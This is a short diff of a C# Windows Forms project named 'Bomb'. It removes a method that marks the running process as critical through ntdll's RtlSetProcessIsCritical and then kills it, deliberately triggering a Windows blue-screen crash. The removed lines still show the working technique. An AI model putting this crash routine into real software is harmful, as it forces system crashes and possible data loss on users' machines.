@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using static Bomb.Program;
 
 namespace Bomb
 {
@@ -36,9 +37,6 @@ namespace Bomb
             InitializeComponent();
             this.as_dialog = as_dialog;
         }
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern void RtlSetProcessIsCritical(int v1, UInt32 v2, UInt32 v3);
 
         private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
         {
@@ -84,13 +82,6 @@ namespace Bomb
                 label5.Text = textBox1.Text;
             }
             catch { }
-        }
-
-        public void BSoD()
-        {
-            Process.EnterDebugMode();
-            RtlSetProcessIsCritical(1, 0, 0);
-            Process.GetCurrentProcess().Kill();
         }
 
         /// <summary>
